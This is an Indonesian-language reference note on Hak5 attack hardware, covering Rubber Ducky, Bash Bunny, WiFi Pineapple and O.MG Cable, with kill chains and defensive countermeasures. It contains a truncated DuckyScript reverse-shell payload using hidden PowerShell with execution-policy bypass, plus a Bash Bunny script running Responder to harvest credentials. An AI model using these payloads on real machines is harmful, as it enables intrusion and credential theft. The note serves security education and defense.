---
title: "Hack5 Suite"
tags:
  - 05-hardware-forensics-and-tactical-devices
  - library
  - military-and-intelligence-tools
aliases:
  - "hack5-suite"
created: "2026-06-28"
updated: "2026-07-01"
status: operational
cssclasses: ""
---

> [!warning] Konteks Etis & Legal
> Perangkat Hak5 adalah alat pengujian keamanan fisik dan jaringan yang diproduksi oleh Hak5 LLC (AS). Alat-alat ini dirancang untuk penetration testing, red teaming, dan edukasi keamanan. Seluruh informasi di bawah berasal dari dokumentasi resmi Hak5, repositori GitHub komunitas, serta penelitian keamanan publik. Pembahasan ini murni **edukasional dan defensif**. Penggunaan terhadap sistem tanpa izin adalah ilegal. Tujuan: membekali defender dengan pemahaman mendalam tentang ancaman fisik dan cara mitigasinya.

---

## 🧬 Gambaran Umum Ekosistem Hak5

Hak5 memproduksi **perangkat keras ofensif portabel** yang mengeksploitasi kelemahan pada lapisan fisik dan antarmuka manusia (USB, WiFi, Ethernet). Berbeda dengan malware atau exploit software, alat Hak5 bekerja dengan **menyamar sebagai perangkat tepercaya** (keyboard, network adapter, charging cable) untuk mengirimkan payload atau mencuri data.

| Perangkat            | Form Factor                     | Target Utama                     | Metode Serangan                                                    |
| -------------------- | ------------------------------- | -------------------------------- | ------------------------------------------------------------------ |
| **USB Rubber Ducky** | USB flash drive                 | Komputer (Windows, macOS, Linux) | Keyboard injection (keystroke payload)                             |
| **Bash Bunny**       | USB flash drive (mini-computer) | Komputer, jaringan               | Multi-stage attack: keyboard injection, network MITM, exfiltration |
| **WiFi Pineapple**   | Router portable                 | WiFi client & AP                 | Rogue Access Point, Evil Twin, deauth, captive portal, sniffing    |
| **O.MG Cable**       | Kabel USB (Lightning/USB-C)     | Komputer, smartphone             | Keyboard injection, data exfiltration, remote control via WiFi     |
| **Shark Jack**       | Kabel Ethernet portabel         | Jaringan kabel                   | Network scanning, payload deployment via Ethernet                  |
| **Packet Squirrel**  | Ethernet inline device          | Jaringan kabel                   | Man-in-the-Middle, VPN pivot, packet capture                       |
| **LAN Turtle**       | USB Ethernet adapter            | Komputer, jaringan               | Covert remote access, DNS spoofing                                 |

---

## 🦆 1. USB Rubber Ducky — Keystroke Injection Device

### Gambaran Umum

USB Rubber Ducky adalah **keyboard injection tool** yang menyamar sebagai USB HID (Human Interface Device) keyboard. Saat dicolokkan ke komputer, ia dikenali sebagai keyboard oleh OS dan mengetikkan payload dengan kecepatan superhuman (>900 karakter per detik). Karena OS mempercayai input keyboard sebagai tindakan pengguna, **tidak ada antivirus atau EDR yang mendeteksi** serangan ini.

### Arsitektur Teknis

| Komponen           | Detail                                                      |
| ------------------ | ----------------------------------------------------------- |
| **Mikrokontroler** | Atmel AT32UC3B (seri klasik) atau ARM Cortex-M3 (seri baru) |
| **Penyimpanan**    | microSD card (payload + loot)                               |
| **Firmware**       | DuckyScript interpreter                                     |
| **Antarmuka**      | USB-A (dikenali sebagai HID Keyboard)                       |
| **Bahasa Payload** | DuckyScript (sederhana, berbasis perintah)                  |

### DuckyScript — Bahasa Payload

```
REM Contoh payload: Reverse Shell via PowerShell
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 500
STRING $client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);...
ENTER
```

**Fitur DuckyScript:**

- `DELAY` — menunggu dalam milidetik
- `STRING` — mengetik teks
- `GUI r` — menekan Windows+R
- `CTRL/ALT/SHIFT` — modifier keys
- Variable & logic (versi 3.0+)

### Kill Chain Rubber Ducky

1. **Delivery**: Attacker mencolokkan Ducky ke port USB target (atau social engineering: "tolong colokkan flashdisk ini").
2. **Enumeration**: OS mengenali Ducky sebagai keyboard.
3. **Payload Execution**: Ducky mengetikkan payload dengan kecepatan tinggi.
4. **Actions on Objective**:
   - Reverse shell
   - Download & execute malware
   - Exfiltrasi file via DNS/HTTP
   - Buat admin account
   - Matikan antivirus/firewall

### Varian & Evolusi

| Varian                   | Keunggulan                                       |
| ------------------------ | ------------------------------------------------ |
| **Rubber Ducky Classic** | Murah, payload DuckyScript sederhana             |
| **Rubber Ducky 3.0**     | ARM Cortex, DuckyScript 3.0, USB-C, stealth mode |
| **DuckyScript 3.0**      | Variables, functions, logic, encryption          |

---

## 🐰 2. Bash Bunny — Mini-Computer untuk Physical Attack

### Gambaran Umum

Bash Bunny adalah **komputer Linux portabel dalam form factor USB flash drive**. Jika Rubber Ducky hanya bisa mengetik, Bash Bunny bisa:

- Menyamar sebagai **multiple devices secara simultan** (keyboard + network adapter + serial + mass storage)
- Menjalankan **bash script penuh** (tidak terbatas DuckyScript)
- Melakukan **Man-in-the-Middle** via emulated Ethernet
- Menyimpan loot di penyimpanan internal

### Arsitektur Teknis

| Komponen        | Detail                                                                         |
| --------------- | ------------------------------------------------------------------------------ |
| **CPU**         | ARM Cortex-A7 (Allwinner R16)                                                  |
| **RAM**         | 512 MB DDR3                                                                    |
| **Penyimpanan** | microSD (payload) + internal flash                                             |
| **OS**          | Debian Linux (custom)                                                          |
| **Antarmuka**   | USB-A (composite device: keyboard + RNDIS + serial + mass storage)             |
| **Switch Mode** | Fisik: posisi 1, 2, 3 (masing-masing bisa dikonfigurasi untuk payload berbeda) |

### Mode Serangan (Switch Positions)

| Posisi | Mode Default          | Fungsi                                          |
| ------ | --------------------- | ----------------------------------------------- |
| **1**  | RNDIS + HID + Storage | Network MITM + keyboard injection + file access |
| **2**  | Serial-only           | Debug & recovery                                |
| **3**  | Customizable          | Bisa dikonfigurasi sesuai kebutuhan             |

### Arsitektur Multi-Stage Attack

```
[Colokkan Bash Bunny]
        │
        ▼
[Boot Linux dalam 5-10 detik]
        │
        ▼
[Jalankan payload.txt di root]
        │
        ├── ATTACKMODE RNDIS_ETHERNET HID STORAGE
        │    (muncul sebagai Ethernet adapter + Keyboard + Flashdisk)
        │
        ├── LED (status indicator)
        │
        ├── RUN Linux commands:
        │      - nmap scan jaringan
        │      - Responder (LLMNR/NBT-NS poisoning)
        │      - tcpdump (capture traffic)
        │      - Metasploit payload
        │      - Exfiltrasi file ke storage internal
        │
        └── FINISH
             (LED hijau = sukses, merah = gagal)
```

### Contoh Payload Bash Bunny (bash script)

```bash
#!/bin/bash
# Payload: Nmap scan + Responder untuk credential harvesting
ATTACKMODE RNDIS_ETHERNET HID STORAGE
LED R 100
# Konfigurasi IP
ifconfig usb0 10.0.0.1 netmask 255.255.255.0 up
# Jalankan Responder di background
responder -I usb0 -w -f &
# Jalankan nmap scan
nmap -sP 10.0.0.0/24 >> /root/udisk/loot/nmap_scan.txt
# Kirimkan hasil via keyboard ke notepad
LED G
```

---

## 🍍 3. WiFi Pineapple — Rogue Access Point & WiFi Attack Platform

### Gambaran Umum

WiFi Pineapple adalah **platform serangan WiFi terintegrasi** yang dikembangkan oleh Hak5. Perangkat ini adalah router Linux portabel dengan software suite untuk:

- **Rogue Access Point** (Evil Twin)
- **Deauthentication Attack**
- **Captive Portal** (phishing kredensial WiFi)
- **Man-in-the-Middle** pada klien WiFi
- **Client Tracking** (MAC address, probe requests)

### Arsitektur Teknis

| Komponen      | Detail                                                |
| ------------- | ----------------------------------------------------- |
| **Hardware**  | Router portable (dual-radio: 2.4 GHz + 5 GHz)         |
| **OS**        | OpenWrt-based (Pineapple OS)                          |
| **Antarmuka** | Web GUI (Pineapple Dashboard) + CLI (SSH)             |
| **Modul**     | Pineapple Modules (PineAP, Evil Portal, Deauth, dll.) |

### Modul Kunci

| Modul              | Fungsi                                                                     |
| ------------------ | -------------------------------------------------------------------------- |
| **PineAP**         | Engine inti: mengumpulkan probe requests, membuat rogue AP, tracking klien |
| **Evil Portal**    | Captive portal phishing — meniru halaman login WiFi                        |
| **Deauth**         | Mengirim deauthentication packets untuk memutuskan klien dari AP sah       |
| **Beacon Manager** | Membuat puluhan SSID palsu (beacon flooding)                               |
| **Recon**          | Passive scanning: mengumpulkan MAC, SSID, dan probe request                |
| **PineAP Suite**   | Kombinasi: Beacon Response, Probe Response, Association                    |

### Kill Chain WiFi Pineapple

1. **Recon (Pasif)**: Pineapple mengumpulkan probe requests dari perangkat di sekitar. Setiap perangkat yang mencari WiFi memancarkan SSID yang pernah diingat (contoh: "Starbucks WiFi", "HomeNetwork").
2. **Evil Twin**: Pineapple membuat AP dengan SSID yang sama persis (dari probe request), tanpa password (atau dengan password yang sama jika diketahui).
3. **Deauth**: Klien yang terhubung ke AP sah diputuskan dengan deauth packets, memaksa mereka reconnect.
4. **Association**: Klien terhubung ke Evil Twin.
5. **Captive Portal**: Klien disajikan halaman login palsu (contoh: "Masukkan password WiFi Anda").
6. **Credential Harvesting**: Kredensial disimpan.
7. **MITM**: Setelah terhubung, semua traffic klien bisa dimonitor (jika tidak HTTPS/HSTS).

### Penggunaan Defensif

WiFi Pineapple juga bisa digunakan untuk:

- **Audit keamanan WiFi** organisasi
- **Deteksi Rogue AP** di lingkungan korporat
- **Wireless Intrusion Detection** (WIDS)
- **Pelatihan keamanan WiFi**

---

## 🔌 4. O.MG Cable — Kabel USB Berbahaya dengan Remote Access

### Gambaran Umum

O.MG Cable adalah **kabel USB yang mengandung implan komputer** di dalam konektor USB-nya. Dari luar, ia tampak dan berfungsi seperti kabel pengisian daya/data biasa. Namun, di dalam konektor terdapat:

- **Microcontroller** (ESP32-S2 atau sejenis)
- **WiFi chip** (untuk remote control)
- **Penyimpanan** (untuk payload)
- **Keylogger** (opsional)

### Kemampuan

| Fitur                       | Detail                                                                         |
| --------------------------- | ------------------------------------------------------------------------------ |
| **Keyboard Injection**      | Mengetikkan payload via HID (seperti Rubber Ducky)                             |
| **Remote Control via WiFi** | Operator bisa mengontrol kabel dari jarak jauh (WiFi access point sendiri)     |
| **Self-Destruct**           | Bisa menghapus firmware sendiri untuk menghilangkan bukti                      |
| **Data Exfiltration**       | Mencuri file dari target, dikirim via WiFi                                     |
| **Keylogging**              | Merekam semua ketukan keyboard target                                          |
| **Transparent Mode**        | Kabel tetap berfungsi sebagai kabel data/charging normal (target tidak curiga) |

### Arsitektur

```
[Konektor USB-A] ─── [Kabel] ─── [Konektor USB-C/Lightning]
       │                              │
       │                              ├── Implan ESP32-S2
       │                              │     ├── WiFi chip
       │                              │     ├── Flash storage
       │                              │     ├── HID emulator
       │                              │     └── Keylogger
       │                              │
       └── Data/Charging pass-through ──┘
```

### Kill Chain O.MG Cable

1. **Delivery**: Target diberikan kabel "gratis" (konferensi, hotel, social engineering).
2. **Connection**: Target menggunakan kabel untuk mengisi daya atau transfer data (fungsi normal tetap bekerja).
3. **Remote Control**: Attacker terhubung ke WiFi O.MG Cable dari jarak dekat (5-10 meter).
4. **Payload Execution**: Attacker mengirimkan payload keyboard injection via WiFi.
5. **Exfiltration**: File dicuri dan dikirim via WiFi.
6. **Cleanup**: Attacker mengaktifkan self-destruct untuk menghapus firmware berbahaya.

### Varian

| Varian               | Konektor                                |
| -------------------- | --------------------------------------- |
| **O.MG Cable Elite** | USB-A ke Lightning (iOS)                |
| **O.MG Cable USB-C** | USB-A ke USB-C (Android, laptop modern) |
| **O.MG Cable USB-A** | USB-A ke USB-A (legacy)                 |

---

## 🛡️ Deteksi & Countermeasures

### 1. Terhadap USB Rubber Ducky & Bash Bunny

| Metode                         | Detail                                                                             |
| ------------------------------ | ---------------------------------------------------------------------------------- |
| **USB Port Control**           | Blokir USB mass storage dan HID yang tidak sah via Group Policy atau endpoint DLP. |
| **Device Allowlisting**        | Hanya izinkan VID/PID (Vendor ID/Product ID) keyboard/mouse yang disetujui.        |
| **Behavioral Detection**       | Monitor keystroke rate: keyboard manusia maksimal ~60 WPM; Ducky >900 WPM.         |
| **USBGuard (Linux)**           | Software yang memblokir perangkat USB yang tidak dikenal.                          |
| **Physically Secure Ports**    | Tutup port USB yang tidak digunakan dengan port lock atau epoxy.                   |
| **Disable Unused USB in BIOS** | Matikan port USB di BIOS untuk workstation sensitif.                               |

### 2. Terhadap WiFi Pineapple

| Metode                                    | Detail                                                                |
| ----------------------------------------- | --------------------------------------------------------------------- |
| **802.11w (Protected Management Frames)** | Mencegah deauthentication attack.                                     |
| **Wireless Intrusion Detection (WIDS)**   | Deteksi rogue AP dan deauth flood.                                    |
| **Client Isolation**                      | AP sah harus mengisolasi klien satu sama lain.                        |
| **Edukasi Pengguna**                      | Waspada terhadap captive portal yang meminta password WiFi.           |
| **VPN**                                   | Gunakan VPN untuk melindungi traffic meskipun terhubung ke Evil Twin. |

### 3. Terhadap O.MG Cable

| Metode                    | Detail                                                                            |
| ------------------------- | --------------------------------------------------------------------------------- |
| **Gunakan Kabel Sendiri** | Jangan pernah menerima kabel dari sumber tidak dikenal.                           |
| **USB Data Blocker**      | Gunakan "USB condom" (data blocker) untuk hanya mengizinkan charging, bukan data. |
| **Inspect Kabel**         | Periksa konektor USB untuk tonjolan atau berat yang tidak normal.                 |
| **WiFi Scanning**         | O.MG Cable memancarkan SSID WiFi; bisa dideteksi dengan WiFi scanner.             |

---

## ↔️ Dual-Use Spectrum

```
DEFENSE ◄──────────────────────────────────────────► OFFENSE

Red Team                  Physical Pentest         Insider Threat
│                         │                        │
Menguji keamanan          Menunjukkan              Menanamkan Bash
fisik dan respons         celah fisik              Bunny untuk akses
SOC terhadap              kepada klien             persisten ke
serangan fisik            │                        jaringan internal
│                         │                        │
│                         ▼                        ▼
▼                         Social engineering       Spionase industri,
Security awareness        awareness                pencurian data
training
```

---

## 🔗 Koneksi dalam Vault

- [[metasploit]] — Bash Bunny bisa menjalankan payload Metasploit (reverse shell, meterpreter).
- [[Cobalt Strike]] — Payload keyboard injection bisa mengirimkan stager Cobalt Strike.
- [[empire]] — PowerShell payload bisa diketikkan via Rubber Ducky / O.MG Cable.
- [[WiFi-Bluetooth-Sniffing]] — WiFi Pineapple adalah alat utama untuk sniffing WiFi.
- [[IMSI Catcher / Stingray]] — Sama-sama alat taktis lapangan untuk intercept; IMSI Catcher untuk cellular, WiFi Pineapple untuk WiFi.
- [[Social Engineering]] — Semua alat Hak5 sangat bergantung pada social engineering untuk delivery.

---

## 📚 Referensi

- Hak5. _Official Documentation: Bash Bunny, WiFi Pineapple, O.MG Cable, Rubber Ducky_. https://hak5.org
- Hak5 GitHub. _Payload Library & Community Scripts_.
- O.MG Cable. _Technical Specifications & Schematics_. https://o.mg.lol
- MITRE ATT&CK: T1200 (Hardware Additions), T1056.001 (Input Capture: Keylogging), T1557 (Adversary-in-the-Middle).

---

_Hak5 Suite Deep Dive | Physical Red Team Hardware | USB, WiFi, & Cable Attack Platform_
